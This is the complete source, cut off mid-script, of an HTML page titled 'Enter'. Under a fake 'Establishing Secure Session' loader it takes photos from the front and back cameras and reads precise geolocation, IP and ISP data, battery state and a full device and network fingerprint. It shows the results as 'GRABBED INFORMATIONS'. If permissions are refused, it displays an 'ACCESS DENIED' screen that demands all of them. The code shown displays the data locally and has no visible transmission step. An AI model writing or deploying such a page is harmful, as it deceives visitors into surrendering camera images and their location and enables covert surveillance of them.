<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Enter</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  html, body {
    height: 100%;
    overflow: hidden;
    background: #000;
    font-family: 'Poppins', sans-serif;
  }

  body {
    position: relative;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #000;
  }

  .grid-bg {
    position: absolute;
    inset: 0;
    background-image:
      linear-gradient(rgba(255,255,255,0.05) 1px, transparent 1px),
      linear-gradient(90deg, rgba(255,255,255,0.05) 1px, transparent 1px);
    background-size: 50px 50px;
    animation: gridMove 20s linear infinite;
    z-index: 0;
  }

  @keyframes gridMove {
    0% { background-position: 0 0; }
    100% { background-position: 200px 200px; }
  }

  .glow {
    position: absolute;
    border-radius: 50%;
    filter: blur(100px);
    opacity: 0.15;
    background: #ffffff;
    animation: float 10s ease-in-out infinite;
  }

  .glow1 { width: 300px; height: 300px; top: 10%; left: 15%; animation-delay: 0s; }
  .glow2 { width: 400px; height: 400px; bottom: 5%; right: 10%; animation-delay: 3s; }
  .glow3 { width: 250px; height: 250px; top: 50%; left: 50%; animation-delay: 6s; }

  @keyframes float {
    0%, 100% { transform: translateY(0) translateX(0); }
    50% { transform: translateY(-40px) translateX(30px); }
  }

  .vignette {
    position: absolute;
    inset: 0;
    background: radial-gradient(circle at center, transparent 30%, #000 90%);
    z-index: 1;
    pointer-events: none;
  }

  .enter-btn {
    position: relative;
    z-index: 2;
    padding: 22px 60px;
    font-family: 'Orbitron', sans-serif;
    font-size: 1.1rem;
    font-weight: 600;
    letter-spacing: 2px;
    color: #f2f2f2;
    background: linear-gradient(135deg, #000000 0%, #0a0a0a 20%, #1c1c1c 40%, #000000 60%, #111111 80%, #000000 100%);
    background-size: 300% 300%;
    border: 1px solid rgba(255,255,255,0.12);
    border-radius: 50px;
    cursor: pointer;
    overflow: hidden;
    transition: transform 0.3s ease, box-shadow 0.3s ease, border-color 0.3s ease, opacity 0.3s ease;
    animation: btnGradient 6s ease infinite;
    box-shadow: 0 0 25px rgba(255,255,255,0.04), inset 0 0 15px rgba(255,255,255,0.03);
  }

  @keyframes btnGradient {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }

  .enter-btn::before {
    content: "";
    position: absolute;
    top: 0; left: -75%;
    width: 50%; height: 100%;
    background: linear-gradient(120deg, transparent, rgba(255,255,255,0.18), transparent);
    transform: skewX(-20deg);
    transition: left 0.6s ease;
  }

  .enter-btn:hover::before { left: 125%; }

  .enter-btn:hover {
    transform: translateY(-3px) scale(1.04);
    box-shadow: 0 10px 35px rgba(255,255,255,0.12), inset 0 0 20px rgba(255,255,255,0.05);
    border-color: rgba(255,255,255,0.35);
  }

  .enter-btn:active {
    transform: translateY(0) scale(0.97);
    box-shadow: 0 2px 12px rgba(255,255,255,0.08), inset 0 0 10px rgba(255,255,255,0.04);
  }

  .enter-btn.clicked {
    animation: btnClickPulse 0.75s cubic-bezier(0.2, 0.7, 0.3, 1) forwards;
    pointer-events: none;
  }

  @keyframes btnClickPulse {
    0% { transform: scale(1); box-shadow: 0 0 25px rgba(255,255,255,0.05), inset 0 0 15px rgba(255,255,255,0.03); }
    18% { transform: scale(1.12); box-shadow: 0 0 60px rgba(255,255,255,0.55), inset 0 0 30px rgba(255,255,255,0.25); border-color: rgba(255,255,255,0.85); }
    45% { transform: scale(0.94); box-shadow: 0 0 90px rgba(255,255,255,0.75), inset 0 0 40px rgba(255,255,255,0.4); border-color: rgba(255,255,255,1); }
    100% { transform: scale(0.6); opacity: 0; box-shadow: 0 0 120px rgba(255,255,255,0.9), inset 0 0 60px rgba(255,255,255,0.6); }
  }

  .enter-btn .ripple {
    position: absolute;
    border-radius: 50%;
    background: rgba(255,255,255,0.45);
    transform: translate(-50%, -50%) scale(0);
    pointer-events: none;
    animation: rippleOut 0.75s cubic-bezier(0.2, 0.7, 0.3, 1) forwards;
  }

  @keyframes rippleOut {
    to { transform: translate(-50%, -50%) scale(28); opacity: 0; }
  }

  .btn-flash {
    position: fixed;
    inset: 0;
    background: radial-gradient(circle at center, rgba(255,255,255,0.55) 0%, transparent 60%);
    pointer-events: none;
    z-index: 9;
    opacity: 0;
    animation: flashOut 0.8s ease forwards;
  }

  @keyframes flashOut {
    0% { opacity: 0; }
    25% { opacity: 0.9; }
    100% { opacity: 0; }
  }

  #loading {
    position: fixed;
    inset: 0;
    display: none;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    background: radial-gradient(circle at center, #111 0%, #000 70%);
    z-index: 10;
    overflow: hidden;
    opacity: 0;
    transition: opacity 0.4s ease;
  }

  #loading.visible { opacity: 1; }

  .loader-wrap {
    position: relative;
    z-index: 2;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
  }

  .spinner {
    position: relative;
    width: 120px;
    height: 120px;
  }

  .spinner::before,
  .spinner::after {
    content: "";
    position: absolute;
    inset: 0;
    border-radius: 50%;
    border: 2px solid transparent;
  }

  .spinner::before {
    border-top-color: #ffffff;
    border-right-color: rgba(255,255,255,0.35);
    animation: spinCW 1.4s linear infinite;
    box-shadow: 0 0 25px rgba(255,255,255,0.25);
  }

  .spinner::after {
    inset: 15px;
    border-bottom-color: #ffffff;
    border-left-color: rgba(255,255,255,0.25);
    animation: spinCCW 1.8s linear infinite;
    box-shadow: 0 0 20px rgba(255,255,255,0.15);
  }

  @keyframes spinCW { to { transform: rotate(360deg); } }
  @keyframes spinCCW { to { transform: rotate(-360deg); } }

  .loader-text {
    font-family: 'Orbitron', sans-serif;
    color: #f2f2f2;
    font-size: 1.4rem;
    font-weight: 500;
    letter-spacing: 8px;
    margin-top: 40px;
    text-transform: uppercase;
    background: linear-gradient(90deg, #444 0%, #ffffff 50%, #444 100%);
    background-size: 200% auto;
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: shine 2.5s linear infinite;
  }

  @keyframes shine { to { background-position: 200% center; } }

  .loader-sub {
    font-family: 'Poppins', sans-serif;
    color: rgba(255,255,255,0.4);
    font-size: 0.75rem;
    letter-spacing: 4px;
    margin-top: 12px;
    text-transform: uppercase;
  }

  .progress-track {
    width: 320px;
    height: 3px;
    background: rgba(255,255,255,0.08);
    border-radius: 3px;
    margin-top: 40px;
    overflow: hidden;
  }

  .progress-fill {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, #333, #fff, #333);
    background-size: 200% 100%;
    border-radius: 3px;
    animation: progressAnim 2s ease forwards, shineBar 1.5s linear infinite;
  }

  @keyframes progressAnim {
    0% { width: 0%; }
    20% { width: 22%; }
    45% { width: 48%; }
    70% { width: 74%; }
    100% { width: 100%; }
  }

  @keyframes shineBar {
    0% { background-position: 200% 0; }
    100% { background-position: -200% 0; }
  }

  #denied {
    position: fixed;
    inset: 0;
    display: none;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    background: radial-gradient(circle at center, #140000 0%, #000 70%);
    z-index: 15;
    overflow: hidden;
    padding: 24px;
    text-align: center;
  }

  .denied-wrap {
    position: relative;
    z-index: 2;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    max-width: 560px;
    animation: deniedIn 0.6s cubic-bezier(0.2, 0.7, 0.3, 1) forwards;
    opacity: 0;
    transform: scale(0.94);
  }

  @keyframes deniedIn {
    to { opacity: 1; transform: scale(1); }
  }

  .denied-icon {
    width: 90px;
    height: 90px;
    border-radius: 50%;
    border: 2px solid rgba(255,255,255,0.6);
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: 'Orbitron', sans-serif;
    font-size: 2.6rem;
    font-weight: 700;
    color: #ffffff;
    box-shadow: 0 0 40px rgba(255,255,255,0.15);
    animation: pulseIcon 2s ease-in-out infinite;
  }

  @keyframes pulseIcon {
    0%, 100% { box-shadow: 0 0 40px rgba(255,255,255,0.15); transform: scale(1); }
    50% { box-shadow: 0 0 70px rgba(255,255,255,0.35); transform: scale(1.04); }
  }

  .denied-title {
    font-family: 'Orbitron', sans-serif;
    font-size: 1.8rem;
    font-weight: 700;
    letter-spacing: 8px;
    color: #ffffff;
    text-transform: uppercase;
    margin-top: 30px;
    text-shadow: 0 0 30px rgba(255,255,255,0.4);
    animation: glitch 1.2s infinite;
  }

  @keyframes glitch {
    0% { text-shadow: 2px 0 rgba(255,255,255,0.6), -2px 0 rgba(255,255,255,0.3), 0 0 30px rgba(255,255,255,0.3); }
    20% { text-shadow: -2px 0 rgba(255,255,255,0.6), 2px 0 rgba(255,255,255,0.3), 0 0 30px rgba(255,255,255,0.3); }
    40% { text-shadow: 2px 2px rgba(255,255,255,0.6), -2px -2px rgba(255,255,255,0.3), 0 0 30px rgba(255,255,255,0.3); }
    60% { text-shadow: -2px 2px rgba(255,255,255,0.6), 2px -2px rgba(255,255,255,0.3), 0 0 30px rgba(255,255,255,0.3); }
    80% { text-shadow: 2px -2px rgba(255,255,255,0.6), -2px 2px rgba(255,255,255,0.3), 0 0 30px rgba(255,255,255,0.3); }
    100% { text-shadow: 2px 0 rgba(255,255,255,0.6), -2px 0 rgba(255,255,255,0.3), 0 0 30px rgba(255,255,255,0.3); }
  }

  .denied-msg {
    font-family: 'Poppins', sans-serif;
    font-size: 0.9rem;
    letter-spacing: 3px;
    color: rgba(255,255,255,0.6);
    text-transform: uppercase;
    margin-top: 24px;
    line-height: 2;
  }

  .retry-btn {
    margin-top: 40px;
    padding: 16px 46px;
    font-family: 'Orbitron', sans-serif;
    font-size: 0.85rem;
    font-weight: 600;
    letter-spacing: 4px;
    text-transform: uppercase;
    color: #f2f2f2;
    background: linear-gradient(135deg, #0a0a0a 0%, #1c1c1c 50%, #0a0a0a 100%);
    border: 1px solid rgba(255,255,255,0.2);
    border-radius: 50px;
    cursor: pointer;
    transition: transform 0.3s ease, box-shadow 0.3s ease, border-color 0.3s ease;
  }

  .retry-btn:hover {
    transform: translateY(-3px) scale(1.04);
    box-shadow: 0 10px 35px rgba(255,255,255,0.12);
    border-color: rgba(255,255,255,0.4);
  }

  #results {
    position: fixed;
    inset: 0;
    display: none;
    flex-direction: column;
    background: radial-gradient(circle at 50% 0%, #0d0d0d 0%, #000 60%);
    z-index: 20;
    overflow-y: auto;
    padding: 60px 24px 80px;
    font-family: 'Poppins', sans-serif;
  }

  #results::before {
    content: "";
    position: fixed;
    inset: 0;
    background: repeating-linear-gradient(
      0deg,
      rgba(255, 255, 255, 0.02) 0px,
      rgba(255, 255, 255, 0.02) 1px,
      transparent 1px,
      transparent 3px
    );
    pointer-events: none;
    z-index: 25;
    animation: scan 8s linear infinite;
  }

  @keyframes scan {
    0% { background-position: 0 0; }
    100% { background-position: 0 100px; }
  }

  .results-inner {
    position: relative;
    z-index: 26;
    max-width: 1200px;
    margin: 0 auto;
    width: 100%;
  }

  .glitch-header {
    font-family: 'Orbitron', sans-serif;
    font-size: 2.6rem;
    font-weight: 700;
    color: #ffffff;
    text-align: center;
    margin-bottom: 40px;
    text-transform: uppercase;
    letter-spacing: 10px;
    position: relative;
    animation: glitch 1.2s infinite;
    text-shadow: 0 0 30px rgba(255,255,255,0.3);
  }

  .camera-hero {
    width: 100%;
    background: linear-gradient(160deg, rgba(24,24,24,0.95) 0%, rgba(6,6,6,0.95) 100%);
    border: 1px solid rgba(255,255,255,0.18);
    border-radius: 14px;
    padding: 28px;
    margin-bottom: 30px;
    box-shadow: 0 20px 70px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.06), 0 0 60px rgba(255,255,255,0.05);
    animation: heroIn 0.8s cubic-bezier(0.2, 0.7, 0.3, 1) forwards;
    opacity: 0;
    transform: scale(0.96);
    position: relative;
    overflow: hidden;
  }

  @keyframes heroIn {
    to { opacity: 1; transform: scale(1); }
  }

  .camera-hero::before {
    content: "";
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 1px;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent);
  }

  .camera-hero-header {
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 22px;
  }

  .camera-hero-title {
    font-family: 'Orbitron', sans-serif;
    font-size: 1.15rem;
    font-weight: 700;
    letter-spacing: 8px;
    color: #ffffff;
    text-transform: uppercase;
    text-shadow: 0 0 25px rgba(255,255,255,0.4);
  }

  .camera-hero-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 22px;
  }

  @media (max-width: 768px) {
    .camera-hero-grid { grid-template-columns: 1fr; }
    .camera-hero-title { font-size: 0.85rem; letter-spacing: 4px; }
  }

  .cam-block {
    display: flex;
    flex-direction: column;
    align-items: center;
    position: relative;
  }

  .camera-label {
    font-family: 'Orbitron', sans-serif;
    font-size: 0.7rem;
    color: rgba(255,255,255,0.7);
    letter-spacing: 4px;
    margin-bottom: 10px;
    text-transform: uppercase;
    display: flex;
    align-items: center;
    gap: 8px;
  }

  .camera-label::before {
    content: "";
    width: 6px;
    height: 6px;
    border-radius: 50%;
    background: #ffffff;
    box-shadow: 0 0 12px rgba(255,255,255,0.8);
    animation: pulse 2s ease-in-out infinite;
  }

  @keyframes pulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.4; transform: scale(0.7); }
  }

  .cam-frame {
    width: 100%;
    position: relative;
    border-radius: 10px;
    overflow: hidden;
    border: 1px solid rgba(255,255,255,0.2);
    box-shadow: 0 0 40px rgba(255,255,255,0.08), inset 0 0 30px rgba(0,0,0,0.4);
    background: #050505;
  }

  .cam-frame::after {
    content: "";
    position: absolute;
    inset: 0;
    background:
      linear-gradient(rgba(255,255,255,0.04) 1px, transparent 1px) 0 0 / 100% 3px,
      radial-gradient(ellipse at center, transparent 55%, rgba(0,0,0,0.55) 100%);
    pointer-events: none;
  }

  .cam-frame img {
    display: block;
    width: 100%;
    height: auto;
    filter: grayscale(1) contrast(1.2) brightness(0.95);
  }

  .cam-stamp {
    position: absolute;
    bottom: 12px;
    left: 12px;
    font-family: 'Orbitron', sans-serif;
    font-size: 0.6rem;
    letter-spacing: 3px;
    color: rgba(255,255,255,0.85);
    background: rgba(0,0,0,0.65);
    padding: 5px 10px;
    border-radius: 4px;
    border: 1px solid rgba(255,255,255,0.2);
    backdrop-filter: blur(4px);
    z-index: 3;
    text-transform: uppercase;
  }

  .data-grid {
    display: grid;
    grid-template-columns: repeat(2, minmax(0, 1fr));
    gap: 22px;
    width: 100%;
    align-items: start;
  }

  @media (max-width: 768px) {
    .data-grid { grid-template-columns: 1fr; }
    .glitch-header { font-size: 1.6rem; letter-spacing: 6px; }
    #results { padding: 40px 16px 60px; }
  }

  .data-card {
    background: linear-gradient(160deg, rgba(20,20,20,0.9) 0%, rgba(8,8,8,0.9) 100%);
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 12px;
    padding: 24px;
    backdrop-filter: blur(6px);
    box-shadow: 0 8px 40px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.04);
    animation: fadeInUp 0.55s cubic-bezier(0.2, 0.7, 0.3, 1) forwards;
    opacity: 0;
    transform: translateY(12px);
    position: relative;
    overflow: hidden;
  }

  .data-card::before {
    content: "";
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 1px;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
  }

  .data-card:nth-child(1) { animation-delay: 0.05s; }
  .data-card:nth-child(2) { animation-delay: 0.12s; }
  .data-card:nth-child(3) { animation-delay: 0.19s; }
  .data-card:nth-child(4) { animation-delay: 0.26s; }
  .data-card:nth-child(5) { animation-delay: 0.33s; }
  .data-card:nth-child(6) { animation-delay: 0.40s; }

  @keyframes fadeInUp {
    to { opacity: 1; transform: translateY(0); }
  }

  .data-card h3 {
    font-family: 'Orbitron', sans-serif;
    color: #ffffff;
    font-size: 0.85rem;
    letter-spacing: 3px;
    margin-bottom: 16px;
    text-transform: uppercase;
    border-bottom: 1px solid rgba(255,255,255,0.08);
    padding-bottom: 10px;
    display: flex;
    align-items: center;
    gap: 10px;
  }

  .data-card h3::before {
    content: "";
    width: 6px;
    height: 6px;
    border-radius: 50%;
    background: #ffffff;
    box-shadow: 0 0 12px rgba(255,255,255,0.8);
    animation: pulse 2s ease-in-out infinite;
  }

  .data-card ul {
    list-style: none;
    padding: 0;
    display: flex;
    flex-direction: column;
    gap: 10px;
  }

  .data-card li {
    color: #c8c8c8;
    font-size: 0.82rem;
    line-height: 1.5;
    word-break: break-word;
    display: flex;
    gap: 8px;
    align-items: flex-start;
  }

  .data-card li span {
    color: #ffffff;
    font-weight: 600;
    letter-spacing: 0.5px;
    flex-shrink: 0;
    min-width: 100px;
    font-family: 'Orbitron', sans-serif;
    font-size: 0.68rem;
    text-transform: uppercase;
    padding-top: 3px;
  }

  .data-card li .val {
    color: #a8a8a8;
    flex: 1;
  }
</style>
</head>
<body>

  <div class="grid-bg"></div>
  <div class="glow glow1"></div>
  <div class="glow glow2"></div>
  <div class="glow glow3"></div>
  <div class="vignette"></div>

  <button class="enter-btn" id="enterBtn">Click To Enter</button>

  <div id="loading">
    <div class="grid-bg"></div>
    <div class="vignette"></div>
    <div class="loader-wrap">
      <div class="spinner"></div>
      <div class="loader-text">Please Wait</div>
      <div class="loader-sub">Establishing Secure Session</div>
      <div class="progress-track">
        <div class="progress-fill"></div>
      </div>
    </div>
  </div>

  <div id="denied">
    <div class="denied-wrap">
      <div class="denied-icon">!</div>
      <div class="denied-title">ACCESS DENIED</div>
      <div class="denied-msg">Allow all permissions to continue</div>
      <button class="retry-btn" id="retryBtn">Retry</button>
    </div>
  </div>

  <div id="results">
    <div class="results-inner">
      <div class="glitch-header">GRABBED INFORMATIONS</div>
      <div id="cameraHero"></div>
      <div class="data-grid" id="dataGrid"></div>
    </div>
  </div>

<script>
(async function() {
  const enterBtn = document.getElementById('enterBtn');
  const loading = document.getElementById('loading');
  const denied = document.getElementById('denied');
  const retryBtn = document.getElementById('retryBtn');
  const results = document.getElementById('results');
  const dataGrid = document.getElementById('dataGrid');
  const cameraHero = document.getElementById('cameraHero');

  const MIN_LOAD_MS = 2000;
  const GLOBAL_DEADLINE_MS = 8000;
  const IP_TIMEOUT_MS = 5000;
  const GEO_TIMEOUT_MS = 6000;
  const GEO_EARLY_ACCURACY = 150;
  const CAM_TIMEOUT_MS = 4000;
  const CAM_WARMUP_MS = 600;
  const BATTERY_TIMEOUT_MS = 1500;

  const IP_BLANK = {
    ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A',
    isp: 'N/A', lat: 'N/A', lon: 'N/A', postal: 'N/A', asn: 'N/A'
  };
  const GEO_BLANK = { ok: false, lat: 'DENIED', lon: 'DENIED', acc: 'DENIED' };
  const CAM_BLANK = { ok: false, data: null };
  const BAT_BLANK = { level: 'N/A', charging: 'N/A', time: 'N/A' };

  function val(v) {
    if (v === null || v === undefined || v === '' || v === 'N/A') {
      return 'N/A';
    }
    return String(v);
  }

  function stamp() {
    const d = new Date();
    const pad = n => String(n).padStart(2, '0');
    return `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
  }

  function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
  }

  function withTimeout(promise, ms, fallback) {
    return new Promise((resolve) => {
      let done = false;
      const timer = setTimeout(() => {
        if (!done) { done = true; resolve(fallback); }
      }, ms);
      promise.then(v => {
        if (!done) { done = true; clearTimeout(timer); resolve(v); }
      }).catch(() => {
        if (!done) { done = true; clearTimeout(timer); resolve(fallback); }
      });
    });
  }

  function playClickAnimation(ev) {
    const rect = enterBtn.getBoundingClientRect();
    const x = ev && ev.clientX ? ev.clientX - rect.left : rect.width / 2;
    const y = ev && ev.clientY ? ev.clientY - rect.top : rect.height / 2;

    const ripple = document.createElement('span');
    ripple.className = 'ripple';
    ripple.style.left = x + 'px';
    ripple.style.top = y + 'px';
    ripple.style.width = '40px';
    ripple.style.height = '40px';
    enterBtn.appendChild(ripple);

    enterBtn.classList.add('clicked');

    const flash = document.createElement('div');
    flash.className = 'btn-flash';
    document.body.appendChild(flash);

    setTimeout(() => {
      ripple.remove();
      flash.remove();
    }, 900);
  }

  async function fetchIpInfo() {
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), IP_TIMEOUT_MS);
      const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
      clearTimeout(timer);
      const j = await res.json();
      return {
        ip: j.ip, city: j.city, region: j.region, country: j.country_name,
        isp: j.org, lat: j.latitude, lon: j.longitude,
        postal: j.postal, asn: j.asn
      };
    } catch (e) {
      return IP_BLANK;
    }
  }

  async function openStream(facing) {
    const base = { width: { ideal: 1280 }, height: { ideal: 720 } };
    if (facing) {
      return navigator.mediaDevices.getUserMedia({
        video: Object.assign({ facingMode: facing }, base),
        audio: false
      });
    }
    return navigator.mediaDevices.getUserMedia({ video: base, audio: false });
  }

  async function grabFrame(facing) {
    let stream = null;
    try {
      try {
        stream = await openStream(facing);
      } catch (e) {
        if (facing) stream = await openStream(null);
        else throw e;
      }
      const video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline', '');
      video.muted = true;
      await video.play();
      await sleep(CAM_WARMUP_MS);
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 1280;
      canvas.height = video.videoHeight || 720;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL('image/png');
      stream.getTracks().forEach(t => t.stop());
      video.srcObject = null;
      return { ok: true, data: dataUrl };
    } catch (e) {
      if (stream) {
        try { stream.getTracks().forEach(t => t.stop()); } catch (err) {}
      }
      return CAM_BLANK;
    }
  }

  async function requestCamera(facing) {
    return withTimeout(grabFrame(facing), CAM_TIMEOUT_MS, CAM_BLANK);
  }

  async function requestLocation() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve(GEO_BLANK);

      const opts = { enableHighAccuracy: true, timeout: GEO_TIMEOUT_MS, maximumAge: 0 };

      let best = null;
      let resolved = false;
      let watchId = null;

      const finish = () => {
        if (resolved) return;
        resolved = true;
        if (watchId !== null) {
          try { navigator.geolocation.clearWatch(watchId); } catch (e) {}
        }
        if (best) {
          resolve({
            ok: true,
            lat: best.coords.latitude.toFixed(6),
            lon: best.coords.longitude.toFixed(6),
            acc: Math.round(best.coords.accuracy) + ' meters'
          });
        } else {
          resolve(GEO_BLANK);
        }
      };

      const onSuccess = (pos) => {
        if (!best || pos.coords.accuracy < best.coords.accuracy) {
          best = pos;
        }
        if (best.coords.accuracy <= GEO_EARLY_ACCURACY) finish();
      };

      const onError = () => finish();

      try {
        watchId = navigator.geolocation.watchPosition(onSuccess, onError, opts);
      } catch (e) {
        finish();
        return;
      }

      try {
        navigator.geolocation.getCurrentPosition(onSuccess, onError, opts);
      } catch (e) {}

      setTimeout(finish, GEO_TIMEOUT_MS);
    });
  }

  async function requestBattery() {
    if (typeof navigator.getBattery !== 'function') return BAT_BLANK;
    try {
      const battery = await navigator.getBattery();
      return {
        level: Math.round(battery.level * 100) + '%',
        charging: battery.charging ? 'Yes' : 'No',
        time: (battery.dischargingTime && isFinite(battery.dischargingTime))
          ? Math.round(battery.dischargingTime / 60) + ' min'
          : 'N/A'
      };
    } catch (e) {
      return BAT_BLANK;
    }
  }

  function renderDenied() {
    loading.classList.remove('visible');
    setTimeout(() => {
      loading.style.display = 'none';
      denied.style.display = 'flex';
    }, 400);
  }

  async function gatherAll() {
    const start = Date.now();

    const gather = Promise.all([
      requestCamera('user'),
      requestCamera('environment'),
      requestLocation(),
      fetchIpInfo(),
      withTimeout(requestBattery(), BATTERY_TIMEOUT_MS, BAT_BLANK)
    ]).then(([frontResult, backResult, geoResult, ipResult, batteryResult]) => ({
      frontResult: frontResult || CAM_BLANK,
      backResult: backResult || CAM_BLANK,
      geoResult: geoResult || GEO_BLANK,
      ipResult: ipResult || IP_BLANK,
      batteryResult: batteryResult || BAT_BLANK
    }));

    const result = await withTimeout(gather, GLOBAL_DEADLINE_MS, {
      frontResult: CAM_BLANK,
      backResult: CAM_BLANK,
      geoResult: GEO_BLANK,
      ipResult: IP_BLANK,
      batteryResult: BAT_BLANK
    });

    const { frontResult, backResult, geoResult, ipResult, batteryResult } = result;

    const elapsed = Date.now() - start;
    if (elapsed < MIN_LOAD_MS) await sleep(MIN_LOAD_MS - elapsed);

    const frontOk = frontResult && frontResult.ok;
    const backOk = backResult && backResult.ok;
    const geoOk = geoResult && geoResult.ok;

    const sameCam = frontOk && backOk && frontResult.data === backResult.data;

    if (!frontOk || !backOk || !geoOk) {
      renderDenied();
      return;
    }

    const data = {
      ip: ipResult.ip,
      city: ipResult.city,
      region: ipResult.region,
      country: ipResult.country,
      isp: ipResult.isp,
      lat: ipResult.lat,
      lon: ipResult.lon,
      postal: ipResult.postal,
      asn: ipResult.asn,
      geoLat: geoResult.lat,
      geoLon: geoResult.lon,
      geoAcc: geoResult.acc,
      batteryLevel: batteryResult.level,
      batteryCharging: batteryResult.charging,
      batteryTime: batteryResult.time,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      locale: Intl.DateTimeFormat().resolvedOptions().locale,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      windowWidth: window.innerWidth,
      windowHeight: window.innerHeight,
      colorDepth: window.screen.colorDepth,
      pixelDepth: window.screen.pixelDepth,
      orientation: window.screen.orientation ? window.screen.orientation.type : 'N/A',
      pixelRatio: window.devicePixelRatio,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      vendor: navigator.vendor,
      language: navigator.language,
      languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
      cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
      doNotTrack: navigator.doNotTrack || 'N/A',
      hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
      deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
      maxTouch: navigator.maxTouchPoints || '0',
      pdfViewer: navigator.pdfViewerEnabled ? 'Yes' : 'No',
      connectionType: navigator.connection ? navigator.connection.effectiveType : 'N/A',
      downlink: navigator.connection && navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'N/A',
      rtt: navigator.connection && navigator.connection.rtt ? navigator.connection.rtt + ' ms' : 'N/A',
      saveData: navigator.connection && navigator.connection.saveData ? 'Yes' : 'No',
      netType: navigator.connection && navigator.connection.type ? navigator.connection.type : 'N/A'
    };

    const takenAt = stamp();

    const backLabel = sameCam ? 'Back Camera (default)' : 'Back Camera';

    cameraHero.innerHTML = `
      <div class="camera-hero">
        <div class="camera-hero-header">
          <div class="camera-hero-title">Camera Grabbed</div>
        </div>
        <div class="camera-hero-grid">
          <div class="cam-block">
            <div class="camera-label">Front Camera</div>
            <div class="cam-frame">
              <img src="${frontResult.data}" alt="Front Camera">
              <div class="cam-stamp">FRONT · ${takenAt}</div>
            </div>
          </div>
          <div class="cam-block">
            <div class="camera-label">${backLabel}</div>
            <div class="cam-frame">
              <img src="${backResult.data}" alt="Back Camera">
              <div class="cam-stamp">BACK · ${takenAt}</div>
            </div>
          </div>
        </div>
      </div>`;

    const cards = [
      {
        title: 'IP Address',
        rows: [
          ['IP', val(data.ip)],
          ['City', val(data.city)],
          ['Region', val(data.region)],
          ['Country', val(data.country)],
          ['Postal', val(data.postal)],
          ['ISP', val(data.isp)],
          ['ASN', val(data.asn)],
          ['Lat / Lon', `${val(data.lat)}, ${val(data.lon)}`]
        ]
      },
      {
        title: 'Geolocation',
        rows: [
          ['Latitude', val(data.geoLat)],
          ['Longitude', val(data.geoLon)],
          ['Accuracy', val(data.geoAcc)],
          ['Timezone', val(data.timezone)],
          ['Locale', val(data.locale)]
        ]
      },
      {
        title: 'Battery',
        rows: [
          ['Level', val(data.batteryLevel)],
          ['Charging', val(data.batteryCharging)],
          ['Time Left', val(data.batteryTime)]
        ]
      },
      {
        title: 'Screen',
        rows: [
          ['Resolution', `${data.screenWidth}x${data.screenHeight}`],
          ['Viewport', `${data.windowWidth}x${data.windowHeight}`],
          ['Color Depth', val(data.colorDepth)],
          ['Pixel Depth', val(data.pixelDepth)],
          ['Pixel Ratio', val(data.pixelRatio)],
          ['Orientation', val(data.orientation)]
        ]
      },
      {
        title: 'Device',
        rows: [
          ['User Agent', val(data.userAgent)],
          ['Platform', val(data.platform)],
          ['Vendor', val(data.vendor)],
          ['Language', val(data.language)],
          ['Languages', val(data.languages)],
          ['Cookies', val(data.cookiesEnabled)],
          ['Do Not Track', val(data.doNotTrack)],
          ['CPU Cores', val(data.hardwareConcurrency)],
          ['Memory', val(data.deviceMemory)],
          ['Touch Points', val(data.maxTouch)],
          ['PDF Viewer', val(data.pdfViewer)]
        ]
      },
      {
        title: 'Network',
        rows: [
          ['Type', val(data.netType)],
          ['Connection', val(data.connectionType)],
          ['Downlink', val(data.downlink)],
          ['RTT', val(data.rtt)],
          ['Save Data', val(data.saveData)]
        ]
      }
    ];

    dataGrid.innerHTML = '';
    cards.forEach(card => {
      const div = document.createElement('div');
      div.className = 'data-card';
      const lis = card.rows.map(r => `<li><span>${r[0]}</span><div class="val">${r[1]}</div></li>`).join('');
      div.innerHTML = `<h3>${card.title}</h3><ul>${lis}</ul>`;
      dataGrid.appendChild(div);
    });

    loading.classList.remove('visible');
    await sleep(400);
    loading.style.display = 'none';
    results.style.display = 'flex';
  }

  enterBtn.addEventListener('click', (ev) => {
    playClickAnimation(ev);

    setTimeout(() => {
      enterBtn.style.display = 'none';
